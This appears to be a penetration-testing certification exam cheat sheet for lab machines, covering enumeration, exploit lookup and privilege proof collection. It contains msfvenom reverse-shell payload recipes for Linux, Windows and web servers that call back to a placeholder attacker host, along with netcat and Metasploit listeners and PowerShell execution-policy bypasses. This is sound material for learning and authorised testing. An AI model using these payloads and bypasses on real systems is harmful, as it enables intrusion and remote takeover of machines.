🖥️ Standalone Machines

3 standalones × up to 20pts each. You only need 2 fully rooted + the AD set to pass. Always document low-priv shell even if no root — partial credit counts.

First 15 Minutes — Decision Flow

structured approach before touching exploits
# 1. Scans are already running (started at exam begin)
# 2. Read ALL nmap output before picking a vector
# 3. searchsploit EVERY service + version found:
searchsploit <service> <version>
searchsploit -x <path>    # read without copying
searchsploit -m <path>    # copy to cwd
searchsploit --cve <CVE>

# 4. Try default creds on every service with auth (see defaults below)
# 5. Web? → gobuster it immediately
# 6. SMB? → null session, shares, vuln scan
# 7. DB exposed? → default creds, version CVEs

Shell Generation — msfvenom

all formats
# Linux ELF:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell32.elf

# Windows EXE:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o shell64.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o shell32.exe

# Web shells:
msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o shell.asp
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f aspx -o shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f war -o shell.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f raw -o shell.jsp

# Staged (use with MSF handler):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o staged.exe
listeners
rlwrap nc -lvnp 4444
rlwrap nc -lvnp 443   # use 443 if 4444 is filtered
pwncat-cs -lp 4444    # auto-stabilizes + file transfer built in

# MSF handler:
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST <KALI>; set LPORT 4444; run"

Shell Stabilization — Do Immediately Every Time

Linux — python pty method
linux
which python3 python python2
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
# If no python:
script /dev/null -c bash
# Then:
export TERM=xterm
# Press Ctrl+Z (background the shell)
stty raw -echo; fg
# Press Enter once or twice
stty rows 50 cols 220
Windows — upgrade to PowerShell
windows
powershell -ep bypass
powershell -nop -ep bypass
# Check AV/AMSI before running tools:
Get-MpComputerStatus | Select AMServiceEnabled,AntispywareEnabled

Stuck? — 30 Minute Checklist

If no progress in 30 minutes, rotate to another target. Return with fresh eyes.
run through before giving up on a target
# 1. ALL ports scanned? (including UDP):
sudo nmap -p- --min-rate 5000 <IP>
sudo nmap -sU --top-ports 25 <IP>

# 2. Virtual hosts?
gobuster vhost -u http://<IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# 3. All file extensions tried?
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -x php,asp,aspx,txt,bak,zip,tar,sql,conf,xml,old

# 4. All collected creds tried on ALL services?
# 5. linpeas/winpeas read fully top to bottom (not skimmed)?
# 6. Page source code checked?
# 7. searchsploit minor versions? (e.g. "openssh 7.2" not just "openssh")
# 8. Any new usernames from web/SNMP/LDAP tried everywhere?
# 9. Non-standard port behavior checked?
# 10. pspy running to catch background processes?

Metasploit — Use Once, Use Wisely

Metasploit can only be used on ONE target machine. Cannot be used for pivoting. Save it for the target where manual exploitation fails or costs too much time.
basic workflow
msfconsole -q
search <service> <version>
use <module_path>
show options
set RHOSTS <IP>
set LHOST <KALI>
set LPORT 4444
run

Proof Collection

Screenshot: proof.txt + whoami/id + hostname in ONE terminal window. Do this immediately after rooting — before moving on.
Linux root proof
linux
id && hostname && ip a && cat /root/proof.txt
Windows admin/system proof
windows
whoami && hostname && ipconfig /all && type C:\Users\Administrator\Desktop\proof.txt
# Alt path:
type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
# Low-priv partial credit:
whoami && hostname && type C:\Users\<user>\Desktop\local.txt
